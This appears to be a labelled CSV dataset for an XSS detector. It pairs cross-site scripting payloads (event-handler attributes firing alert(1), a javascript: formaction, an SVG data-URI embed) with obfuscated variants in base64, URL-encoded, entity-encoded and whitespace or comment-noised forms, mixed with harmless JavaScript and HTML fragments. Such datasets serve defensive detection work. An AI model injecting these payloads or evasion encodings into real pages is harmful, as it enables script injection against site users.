sample_id,label,payload_original,payload_obfuscated,generator,recipe
2284,1,<dl onpointerup=alert(1)>xss</dl>,PGRsIG9ucG9pbnRlcnVwPWFsZXJ0KDEpPnhzczwvZGw+,tool_baseline,base64
2285,0,"} getnextactiveelement(items, target, key === arrow_down_key, !items.includes(target)).focus() }","} getnextactiveelement(items, target, key === arrow_down_key, !items.includes(target)).focus() }",tool_baseline,none
2286,1,<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,<bdo id=x tabindex=  1 ondeactivate=alert(1) ></bdo><input id=y autofocus>,tool_baseline,whitespace_noise
2287,0,"this._observablesections.set(anchor.hash, observablesection) } }","this._observablesections.set(anchor.hash, observablesection) } }",tool_baseline,none
2288,1,<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>,PGRsIGlkPXggdGFiaW5kZXg9MSBvbmRlYWN0aXZhdGU9YWxlcnQoMSk+PC9kbD48aW5wdXQgaWQ9eSBhdXRvZm9jdXM+,tool_baseline,base64
2289,0,this._createdragtarget(); this._setupeventhandlers(); this._setupclasses();,this._createdragtarget(); this._setupeventhandlers(); this._setupclasses();,tool_baseline,none
2290,1,<b onpointerleave=alert(1)>xss</b>,<b onpointerleave=alert(1)>xss</b>,tool_baseline,whitespace_noise
2291,1,"<plaintext draggable=""true"" ondragstart=""alert(1)"">test</plaintext>",&lt;plaintext draggable=&quot;true&quot; ondragstart=&quot;alert(1)&quot;&gt;test&lt;/plaintext&gt;,tool_baseline,html_entities
2292,1,"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",PHVsIGRyYWdnYWJsZT0idHJ1ZSIgb25kcmFnZW50ZXI9ImFsZXJ0KDEpIj50ZXN0PC91bD4=,tool_baseline,base64
2293,0,} _isanimated() { return this._element.classlist.contains(class_name_slide);,} _isanimated() { return this._element.classlist.contains(class_name_slide);,tool_baseline,none
2294,1,"<spacer onmouseleave=""alert(1)"">test</spacer>",&lt;spacer onmouseleave=&quot;alert(1)&quot;&gt;test&lt;/spacer&gt;,tool_baseline,html_entities
2295,0,relativex = e.touches[0].pagex - pos.left,relativex = e.touches[0].pagex - pos.left,tool_baseline,none
2296,0,var $collapsiblelis = this.$el.children('li'),var $collapsiblelis = this.$el.children('li'),tool_baseline,none
2297,0,"prev(element, selector) { let previous = element.previouselementsibling; while (previous) {","prev(element, selector) { let previous = element.previouselementsibling; while (previous) {",tool_baseline,none
2298,0,$closesttrigger[0].m_dropdown.isopen ) { leavetoactivedropdowntrigger = true;,$closesttrigger[0].m_dropdown.isopen ) { leavetoactivedropdowntrigger = true;,tool_baseline,none
2299,0,"const link = document.queryselector(`.bd-aside a[href=""${hash}""]`) if (!link) { return","const link = document.queryselector(`.bd-aside a[href=""${hash}""]`) if (!link) { return",tool_baseline,none
2300,0,this._slide(order_next); } nextwhenvisible() {,this._slide(order_next); } nextwhenvisible() {,tool_baseline,none
2301,0,} var clientrect = element.getboundingclientrect(); var scalex = 1;,} var clientrect = element.getboundingclientrect(); var scalex = 1;,tool_baseline,none
2302,0,"group = unique(group.slice().sort(function(a, b){ return a - b","group = unique(group.slice().sort(function(a, b){ return a - b",tool_baseline,none
2303,1,"<link draggable=""true"" ondragend=""alert(1)"">test</link>","<link draggable=""true""  ondragend=""alert( 1)  "">test</  link>  ",tool_baseline,whitespace_noise
2304,0,switch (type.tolowercase()) {,switch (type.tolowercase()) {,tool_baseline,none
2305,1,"<dir onmouseout=""alert(1)"">test</dir>",%3Cdir%20onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,tool_baseline,urlencode
2306,0,"this.data(key, name[key]); } return this;","this.data(key, name[key]); } return this;",tool_baseline,none
2307,1,"<title onmouseup=""alert(1)"">test</title>","< title onmouseup= ""alert(  1)"">test< /  title> ",tool_baseline,whitespace_noise
2308,1,<data onpointerup=alert(1)>xss</data>,%3Cdata%20onpointerup%3Dalert%281%29%3Exss%3C%2Fdata%3E,tool_baseline,urlencode
2309,1,"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>","&lt;embed src=&quot;data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==&quot; type=&quot;image/svg+xml&quot; allowscriptaccess=&quot;always&quot;&gt;&lt;/embed&gt;",tool_baseline,html_entities
2310,0,this.el.m_tooltip = this,this.el.m_tooltip = this,tool_baseline,none
2311,1,"<form onformdata=""alert(1)""><button>click</button></form>","< form onformdata=""  alert(1)"">< button>click</ button><  /form>",tool_baseline,whitespace_noise
2312,0,"'notify:sass_compile' ]); grunt.registertask('server', ['browsersync', 'notify:server']);","'notify:sass_compile' ]); grunt.registertask('server', ['browsersync', 'notify:server']);",tool_baseline,none
2313,0,"this._setattributeifnotexists(outerelem, 'role', 'presentation')","this._setattributeifnotexists(outerelem, 'role', 'presentation')",tool_baseline,none
2314,1,"<strong onmouseup=""alert(1)"">test</strong>",&lt;strong onmouseup=&quot;alert(1)&quot;&gt;test&lt;/strong&gt;,tool_baseline,html_entities
2315,0,document.documentelement.nouilisteners.foreach(function( c ) {,document.documentelement.nouilisteners.foreach(function( c ) {,tool_baseline,none
2316,0,const class_name_fade$1 = 'fade'; const class_name_show$1 = 'show'; const class_dropdown = 'dropdown';,const class_name_fade$1 = 'fade'; const class_name_show$1 = 'show'; const class_dropdown = 'dropdown';,tool_baseline,none
2317,1,<form><button formaction=javascript:alert(1)>xss,<form><button formaction=javascript:alert(1)>xss,tool_baseline,whitespace_noise
2318,0,"}; var parallax = function (_component5) { _inherits(parallax, _component5);","}; var parallax = function (_component5) { _inherits(parallax, _component5);",tool_baseline,none
2319,1,"<base onmousedown=""alert(1)"">test</base>","<base onmousedown=""alert(1)"">te/*OBF*/st</base>",tool_baseline,comment_marker
2320,0,const selector_nav_links = '.nav-link' const selector_nav_items = '.nav-item' const selector_list_items = '.list-group-item',const selector_nav_links = '.nav-link' const selector_nav_items = '.nav-item' const selector_list_items = '.list-group-item',tool_baseline,none
2321,0,var dochandlekeyup = function (e) { m.keydown = false; if (e.which === m.keys.tab || e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) {,var dochandlekeyup = function (e) { m.keydown = false; if (e.which === m.keys.tab || e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) {,tool_baseline,none
2322,1,<source onpointerup=alert(1)>xss</source>,&lt;source onpointerup=alert(1)&gt;xss&lt;/source&gt;,tool_baseline,html_entities
2323,0,} this._settabsandtabwidth(); this._animateindicator(previndex);,} this._settabsandtabwidth(); this._animateindicator(previndex);,tool_baseline,none
2324,1,"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;u ondrop=alert(1) contenteditable&gt;drop here&lt;/u&gt;,tool_baseline,html_entities
2325,1,"<menu draggable=""true"" ondragleave=""alert(1)"">test</menu>",%3Cmenu%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fmenu%3E,tool_baseline,urlencode
2326,1,"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PGZvcm0gb25kcmFnb3Zlcj1hbGVydCgxKSBjb250ZW50ZWRpdGFibGU+ZHJvcCBoZXJlPC9mb3JtPg==,tool_baseline,base64
2327,0,var depmodifier = map.get(dep); if (depmodifier) { sort(depmodifier);,var depmodifier = map.get(dep); if (depmodifier) { sort(depmodifier);,tool_baseline,none
2328,1,<img id=x tabindex=1 onfocus=alert(1)></img>,<img id=x t/*OBF*/abindex=1 onfocus=alert(1)></img>,tool_baseline,comment_marker
2329,0,"removehandler(element, events, typeevent, callable, isdelegated ? handler : null); return; }","removehandler(element, events, typeevent, callable, isdelegated ? handler : null); return; }",tool_baseline,none
2330,0,"<li><a href=""/wiki/otto_neurath"" title=""otto neurath"">otto neurath </a> </li>","<li><a href=""/wiki/otto_neurath"" title=""otto neurath"">otto neurath </a> </li>",tool_baseline,none
2331,0,"<p><a href=""/wiki/knowledge_representation"" class=""mw-redirect"" title=""knowledge representation"">knowledge representation </a><sup id=""cite_ref-knowledge_representation_91-0"" class=""reference""><a href=""#cite_note-knowledge_representation-91"">&#91;88&#93; </a> </sup> and <a href=""/wiki/knowledge_engineering"" title=""knowledge engineering"">knowledge engineering </a><sup id=""cite_ref-knowledge_engineering_92-0"" class=""reference""><a href=""#cite_note-knowledge_engineering-92"">&#91;89&#93; </a> </sup> are central to classical ai research. some ""expert systems"" attempt to gather together explicit knowledge possessed by experts in some narrow domain. in addition, some projects attempt to gather the ""commonsense knowledge"" known to the average person into a database containing extensive knowledge about the world. among the things a comprehensive commonsense knowledge base would contain are: objects, properties, categories and relations between objects;<sup id=""cite_ref-representing_categories_and_relations_93-0"" class=""reference""><a href=""#cite_note-representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> situations, events, states and time;<sup id=""cite_ref-representing_time_94-0"" class=""reference""><a href=""#cite_note-representing_time-94"">&#91;91&#93; </a> </sup> causes and effects;<sup id=""cite_ref-representing_causation_95-0"" class=""reference""><a href=""#cite_note-representing_causation-95"">&#91;92&#93; </a> </sup> knowledge about knowledge (what we know about what other people know);<sup id=""cite_ref-representing_knowledge_about_knowledge_96-0"" class=""reference""><a href=""#cite_note-representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> and many other, less well researched domains. a representation of ""what exists"" is an <a href=""/wiki/ontology_(computer_science)"" class=""mw-redirect"" title=""ontology (computer science)"">ontology </a>: the set of objects, relations, concepts, and properties formally described so that software agents can interpret them. the <a href=""/wiki/semantics"" title=""semantics"">semantics </a> of these are captured as <a href=""/wiki/description_logic"" title=""description logic"">description logic </a> concepts, roles, and individuals, and typically implemented as classes, properties, and individuals in the <a href=""/wiki/web_ontology_language"" title=""web ontology language"">web ontology language </a>.<sup id=""cite_ref-97"" class=""reference""><a href=""#cite_note-97"">&#91;94&#93; </a> </sup> the most general ontologies are called <a href=""/wiki/upper_ontology"" title=""upper ontology"">upper ontologies </a>, which attempt to provide a foundation for all other knowledge<sup id=""cite_ref-ontology_98-0"" class=""reference""><a href=""#cite_note-ontology-98"">&#91;95&#93; </a> </sup> by acting as mediators between <a href=""/wiki/domain_ontology"" class=""mw-redirect"" title=""domain ontology"">domain ontologies </a> that cover specific knowledge about a particular knowledge domain (field of interest or area of concern). such formal knowledge representations can be used in content-based indexing and retrieval,<sup id=""cite_ref-99"" class=""reference""><a href=""#cite_note-99"">&#91;96&#93; </a> </sup> scene interpretation,<sup id=""cite_ref-100"" class=""reference""><a href=""#cite_note-100"">&#91;97&#93; </a> </sup> clinical decision support,<sup id=""cite_ref-101"" class=""reference""><a href=""#cite_note-101"">&#91;98&#93; </a> </sup> knowledge discovery (mining ""interesting"" and actionable inferences from large databases),<sup id=""cite_ref-102"" class=""reference""><a href=""#cite_note-102"">&#91;99&#93; </a> </sup> and other areas.<sup id=""cite_ref-103"" class=""reference""><a href=""#cite_note-103"">&#91;100&#93; </a> </sup>","<p><a href=""/wiki/knowledge_representation"" class=""mw-redirect"" title=""knowledge representation"">knowledge representation </a><sup id=""cite_ref-knowledge_representation_91-0"" class=""reference""><a href=""#cite_note-knowledge_representation-91"">&#91;88&#93; </a> </sup> and <a href=""/wiki/knowledge_engineering"" title=""knowledge engineering"">knowledge engineering </a><sup id=""cite_ref-knowledge_engineering_92-0"" class=""reference""><a href=""#cite_note-knowledge_engineering-92"">&#91;89&#93; </a> </sup> are central to classical ai research. some ""expert systems"" attempt to gather together explicit knowledge possessed by experts in some narrow domain. in addition, some projects attempt to gather the ""commonsense knowledge"" known to the average person into a database containing extensive knowledge about the world. among the things a comprehensive commonsense knowledge base would contain are: objects, properties, categories and relations between objects;<sup id=""cite_ref-representing_categories_and_relations_93-0"" class=""reference""><a href=""#cite_note-representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> situations, events, states and time;<sup id=""cite_ref-representing_time_94-0"" class=""reference""><a href=""#cite_note-representing_time-94"">&#91;91&#93; </a> </sup> causes and effects;<sup id=""cite_ref-representing_causation_95-0"" class=""reference""><a href=""#cite_note-representing_causation-95"">&#91;92&#93; </a> </sup> knowledge about knowledge (what we know about what other people know);<sup id=""cite_ref-representing_knowledge_about_knowledge_96-0"" class=""reference""><a href=""#cite_note-representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> and many other, less well researched domains. a representation of ""what exists"" is an <a href=""/wiki/ontology_(computer_science)"" class=""mw-redirect"" title=""ontology (computer science)"">ontology </a>: the set of objects, relations, concepts, and properties formally described so that software agents can interpret them. the <a href=""/wiki/semantics"" title=""semantics"">semantics </a> of these are captured as <a href=""/wiki/description_logic"" title=""description logic"">description logic </a> concepts, roles, and individuals, and typically implemented as classes, properties, and individuals in the <a href=""/wiki/web_ontology_language"" title=""web ontology language"">web ontology language </a>.<sup id=""cite_ref-97"" class=""reference""><a href=""#cite_note-97"">&#91;94&#93; </a> </sup> the most general ontologies are called <a href=""/wiki/upper_ontology"" title=""upper ontology"">upper ontologies </a>, which attempt to provide a foundation for all other knowledge<sup id=""cite_ref-ontology_98-0"" class=""reference""><a href=""#cite_note-ontology-98"">&#91;95&#93; </a> </sup> by acting as mediators between <a href=""/wiki/domain_ontology"" class=""mw-redirect"" title=""domain ontology"">domain ontologies </a> that cover specific knowledge about a particular knowledge domain (field of interest or area of concern). such formal knowledge representations can be used in content-based indexing and retrieval,<sup id=""cite_ref-99"" class=""reference""><a href=""#cite_note-99"">&#91;96&#93; </a> </sup> scene interpretation,<sup id=""cite_ref-100"" class=""reference""><a href=""#cite_note-100"">&#91;97&#93; </a> </sup> clinical decision support,<sup id=""cite_ref-101"" class=""reference""><a href=""#cite_note-101"">&#91;98&#93; </a> </sup> knowledge discovery (mining ""interesting"" and actionable inferences from large databases),<sup id=""cite_ref-102"" class=""reference""><a href=""#cite_note-102"">&#91;99&#93; </a> </sup> and other areas.<sup id=""cite_ref-103"" class=""reference""><a href=""#cite_note-103"">&#91;100&#93; </a> </sup>",tool_baseline,none
2332,1,<datalist onpointerup=alert(1)>xss</datalist>,%3Cdatalist%20onpointerup%3Dalert%281%29%3Exss%3C%2Fdatalist%3E,tool_baseline,urlencode
2333,0,"newcoordinates = this._repositionwithinscreen( targetleft, targettop,","newcoordinates = this._repositionwithinscreen( targetleft, targettop,",tool_baseline,none
2334,1,"<audio onmousemove=""alert(1)"">test</audio>","<audio onmousemove=""alert(1)"">test</audio>",tool_baseline,whitespace_noise
2335,0,var baseplacement = placement ? getbaseplacement(placement) : null,var baseplacement = placement ? getbaseplacement(placement) : null,tool_baseline,none
2336,0,"var b = a.length;2 !== b || h.obj(a[0]) ? h.fnc(c.duration) || (d.duration = c.duration / b) : a = { value: a }; }return m(a).map(function (a, b) { b = b ? 0 : c.delay;a = h.obj(a) && !h.pth(a) ? a : { value: a };h.und(a.delay) && (a.delay = b);return a;","var b = a.length;2 !== b || h.obj(a[0]) ? h.fnc(c.duration) || (d.duration = c.duration / b) : a = { value: a }; }return m(a).map(function (a, b) { b = b ? 0 : c.delay;a = h.obj(a) && !h.pth(a) ? a : { value: a };h.und(a.delay) && (a.delay = b);return a;",tool_baseline,none
2337,0,"this._queuecallback(complete, element, element.classlist.contains(class_name_fade$1)); } _keydown(event) {","this._queuecallback(complete, element, element.classlist.contains(class_name_fade$1)); } _keydown(event) {",tool_baseline,none
2338,0,</span></a></dt><dd>learn how to use python’s builtin logging on scrapy.</dd>,</span></a></dt><dd>learn how to use python’s builtin logging on scrapy.</dd>,tool_baseline,none
2339,1,"<col onkeypress=""alert(1)"" contenteditable>test</col>",PGNvbCBvbmtleXByZXNzPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2NvbD4=,tool_baseline,base64
2340,0,"<li><a href=""/wiki/domain-specific_language"" title=""domain-specific language"">domain-specific language </a> </li>","<li><a href=""/wiki/domain-specific_language"" title=""domain-specific language"">domain-specific language </a> </li>",tool_baseline,none
2341,0,this._focustrap = this._initializefocustrap(); this._addeventlisteners(); },this._focustrap = this._initializefocustrap(); this._addeventlisteners(); },tool_baseline,none
2342,1,"<nextid draggable=""true"" ondragstart=""alert(1)"">test</nextid>","<nextid draggable=""true"" ondragstart=""alert(1)""> test</nextid> ",tool_baseline,whitespace_noise
2343,1,<ol onpointerout=alert(1)>xss</ol>,%3Col%20onpointerout%3Dalert%281%29%3Exss%3C%2Fol%3E,tool_baseline,urlencode
2344,1,"<style>@keyframes slidein {}</style><h1 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></h1>","<style>@keyframes slidein {}</style><h1 style=""animation-d/*OBF*/uration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiterat/*OBF*/ion=""alert(1)""></h1>",tool_baseline,comment_marker
2345,1,"<noembed onmouseup=""alert(1)"">test</noembed>","<noembed onmouseup=""alert(  1)  "">test</noembed>",tool_baseline,whitespace_noise
2346,1,"<style>:target {transform: rotate(180deg);}</style><link id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></link>",&lt;style&gt;:target {transform: rotate(180deg);}&lt;/style&gt;&lt;link id=x style=&quot;transition:transform 2s&quot; ontransitionrun=alert(1)&gt;&lt;/link&gt;,tool_baseline,html_entities
2347,0,"if (prevselected !== selected) { $(this._valuedict[key].el).prop('selected', selected); this.$el.trigger('change');","if (prevselected !== selected) { $(this._valuedict[key].el).prop('selected', selected); this.$el.trigger('change');",tool_baseline,none
2348,0,attributeoptions.html = tooltiptextoption,attributeoptions.html = tooltiptextoption,tool_baseline,none
2349,0,"}) eventhandler.on(window, event_load_data_api, () => { for (const selector of selectorengine.find(open_selector)) {","}) eventhandler.on(window, event_load_data_api, () => { for (const selector of selectorengine.find(open_selector)) {",tool_baseline,none
2350,1,<image onpointerleave=alert(1)>xss</image>,&lt;image onpointerleave=alert(1)&gt;xss&lt;/image&gt;,tool_baseline,html_entities
2351,1,<aside onpointerover=alert(1)>xss</aside>,&lt;aside onpointerover=alert(1)&gt;xss&lt;/aside&gt;,tool_baseline,html_entities
2352,0,const data_api_key$1 = '.data-api',const data_api_key$1 = '.data-api',tool_baseline,none
2353,1,<nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>,%3Cnextid%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%3E%3C%2Fnextid%3E,tool_baseline,urlencode
2354,0,b;for (b in a) { d[b] = c.hasownproperty(b) ? c[b] : a[b]; }return d;,b;for (b in a) { d[b] = c.hasownproperty(b) ? c[b] : a[b]; }return d;,tool_baseline,none
2355,0,"arr = void 0, opts = this.options, isminyear = year === opts.minyear,","arr = void 0, opts = this.options, isminyear = year === opts.minyear,",tool_baseline,none
2356,0,"acc[placement] = detectoverflow(state, {","acc[placement] = detectoverflow(state, {",tool_baseline,none
2357,0,"}; function each(collection, callback) { var l = collection.length,","}; function each(collection, callback) { var l = collection.length,",tool_baseline,none
2358,0,"}; class scrollspy extends component { constructor(el, options) {","}; class scrollspy extends component { constructor(el, options) {",tool_baseline,none
2359,1,<embed onpointerout=alert(1)>xss</embed>,<embed onpointerout=alert(1)>xss</embed>,tool_baseline,whitespace_noise
2360,0,"this.modal.open(); } }, {","this.modal.open(); } }, {",tool_baseline,none
2361,0,return gethtmlelementscroll(node),return gethtmlelementscroll(node),tool_baseline,none
2362,0,const completecallback = () => { if (!this._config.scroll || this._config.backdrop) { this._focustrap.activate(),const completecallback = () => { if (!this._config.scroll || this._config.backdrop) { this._focustrap.activate(),tool_baseline,none
2363,0,"var e = d[b], k = e.animatable, h = e.tweens,","var e = d[b], k = e.animatable, h = e.tweens,",tool_baseline,none
2364,0,this._renderdatedisplay(); datepicker._settostartofday(this.date); this.gotodate(this.date);,this._renderdatedisplay(); datepicker._settostartofday(this.date); this.gotodate(this.date);,tool_baseline,none
2365,0,"const event_keydown_dismiss = `keydown.dismiss${event_key}` const selector_data_toggle = '[data-bs-toggle=""offcanvas""]' const default = {","const event_keydown_dismiss = `keydown.dismiss${event_key}` const selector_data_toggle = '[data-bs-toggle=""offcanvas""]' const default = {",tool_baseline,none
2366,0,"<li><a href=""#citerefmoravec1988"">moravec 1988 </a>, p.&#160;13, </li>","<li><a href=""#citerefmoravec1988"">moravec 1988 </a>, p.&#160;13, </li>",tool_baseline,none
2367,0,"f.push(b[1]), n.push(b[2]); }a = r(n, function (a, b) { return f[b] === c;","f.push(b[1]), n.push(b[2]); }a = r(n, function (a, b) { return f[b] === c;",tool_baseline,none
2368,0,"function component(classdef, el, options) {","function component(classdef, el, options) {",tool_baseline,none
2369,0,} return abbr ? opts.i18n.weekdaysabbrev[day] : opts.i18n.weekdays[day]; },} return abbr ? opts.i18n.weekdaysabbrev[day] : opts.i18n.weekdays[day]; },tool_baseline,none
2370,0,return } if (this._isshown()) {,return } if (this._isshown()) {,tool_baseline,none
2371,1,"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>","<dfn draggable=""true"" ondragenter=""alert/*OBF*/(1)"">test</dfn>",tool_baseline,comment_marker
2372,0,} _handlefocus(e) { if (!this.el.contains(e.target) && this._nthmodalopened === modal._modalsopen) {,} _handlefocus(e) { if (!this.el.contains(e.target) && this._nthmodalopened === modal._modalsopen) {,tool_baseline,none
2373,1,"<dfn draggable=""true"" ondragstart=""alert(1)"">test</dfn>","<dfn draggable=""true"" ondragstart=""  alert(1)"">test</dfn>",tool_baseline,whitespace_noise
2374,1,"<section onbeforecopy=""alert(1)"" contenteditable>test</section>",PHNlY3Rpb24gb25iZWZvcmVjb3B5PSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L3NlY3Rpb24+,tool_baseline,base64
2375,1,"<i draggable=""true"" ondragend=""alert(1)"">test</i>","<i draggabl/*OBF*/e=""tr/*OBF*/ue"" ondragend=""alert(1)"">test</i>",tool_baseline,comment_marker
2376,0,"} if ( entry.min === entry.max ) { throw new error(""nouislider: 'range' 'min' and 'max' cannot be equal."");","} if ( entry.min === entry.max ) { throw new error(""nouislider: 'range' 'min' and 'max' cannot be equal."");",tool_baseline,none
2377,0,"'<div class=""datepicker-calendar""></div>',","'<div class=""datepicker-calendar""></div>',",tool_baseline,none
2378,1,"<ol onpaste=""alert(1)"" contenteditable>test</ol>",%3Col%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fol%3E,tool_baseline,urlencode
2379,0,"document.addeventlistener('keydown', dochandlekeydown, true); document.addeventlistener('keyup', dochandlekeyup, true); document.addeventlistener('focus', dochandlefocus, true);","document.addeventlistener('keydown', dochandlekeydown, true); document.addeventlistener('keyup', dochandlekeyup, true); document.addeventlistener('focus', dochandlefocus, true);",tool_baseline,none
2380,0,const event_key$a = `.${data_key$9}`,const event_key$a = `.${data_key$9}`,tool_baseline,none
2381,0,execute(direction > 0 ? this._config.rightcallback : this._config.leftcallback); } _initevents() {,execute(direction > 0 ? this._config.rightcallback : this._config.leftcallback); } _initevents() {,tool_baseline,none
2382,1,"<ol onkeyup=""alert(1)"" contenteditable>test</ol>","< ol onkeyup=""alert(1)"" contenteditable>test</ol>  ",tool_baseline,whitespace_noise
2383,0,"let purekey = key.replace(/^bs/, '')","let purekey = key.replace(/^bs/, '')",tool_baseline,none
2384,0,"this._backdrop.hide(); const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding);","this._backdrop.hide(); const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding);",tool_baseline,none
2385,1,"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationstart=""alert(1)""></picture>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cpicture%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Fpicture%3E,tool_baseline,urlencode
2386,0,"} else { firstimage.one('load', function (el, i) { _this65.$el.css('height', el.offsetheight + 'px');","} else { firstimage.one('load', function (el, i) { _this65.$el.css('height', el.offsetheight + 'px');",tool_baseline,none
2387,0,if (element.getattribute('role') !== 'tab') { element.classlist.add(class_name_show) return,if (element.getattribute('role') !== 'tab') { element.classlist.add(class_name_show) return,tool_baseline,none
2388,0,_gettipelement() { if (!this.tip) { this.tip = this._createtipelement(this._newcontent || this._getcontentfortemplate());,_gettipelement() { if (!this.tip) { this.tip = this._createtipelement(this._newcontent || this._getcontentfortemplate());,tool_baseline,none
2389,0,} element.classlist.add(class_name_show$5); this._emulateanimation(() => {,} element.classlist.add(class_name_show$5); this._emulateanimation(() => {,tool_baseline,none
2390,1,<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>,<pre onblur=alert(1) tabindex=1 id= x></pre><input autofocus>,tool_baseline,whitespace_noise
2391,0,"this.$ambtn = $('<div class=""am-btn"">am</div>'); this.$pmbtn = $('<div class=""pm-btn"">pm</div>'); this.$ambtn.on('click', this._handleampmclick.bind(this)).appendto(this.spanampm);","this.$ambtn = $('<div class=""am-btn"">am</div>'); this.$pmbtn = $('<div class=""pm-btn"">pm</div>'); this.$ambtn.on('click', this._handleampmclick.bind(this)).appendto(this.spanampm);",tool_baseline,none
2392,0,for (const anchor of targetlinks) { if (!anchor.hash || isdisabled(anchor)) { continue,for (const anchor of targetlinks) { if (!anchor.hash || isdisabled(anchor)) { continue,tool_baseline,none
2393,0,"selectorengine.findone(selector_dropdown_toggle, target.closest(selector_dropdown)).classlist.add(class_name_active)","selectorengine.findone(selector_dropdown_toggle, target.closest(selector_dropdown)).classlist.add(class_name_active)",tool_baseline,none
2394,0,var $collapsiblelis = $collapsible.children('li'); var isactive = $collapsibleli[0].classlist.contains('active'); var index = $collapsiblelis.index($collapsibleli);,var $collapsiblelis = $collapsible.children('li'); var isactive = $collapsibleli[0].classlist.contains('active'); var index = $collapsiblelis.index($collapsibleli);,tool_baseline,none
2395,0,cleartimeout(this._exitdelaytimeout),cleartimeout(this._exitdelaytimeout),tool_baseline,none
2396,0,} } sidenav._sidenavs = [];,} } sidenav._sidenavs = [];,tool_baseline,none
2397,1,<header onpointerout=alert(1)>xss</header>,%3Cheader%20onpointerout%3Dalert%281%29%3Exss%3C%2Fheader%3E,tool_baseline,urlencode
2398,0,"this.el.addeventlistener('blur', chips._handlechipsblur, true)","this.el.addeventlistener('blur', chips._handlechipsblur, true)",tool_baseline,none
2399,0,"<li><a href=""/wiki/computational_mathematics"" title=""computational mathematics"">computational mathematics </a> </li>","<li><a href=""/wiki/computational_mathematics"" title=""computational mathematics"">computational mathematics </a> </li>",tool_baseline,none
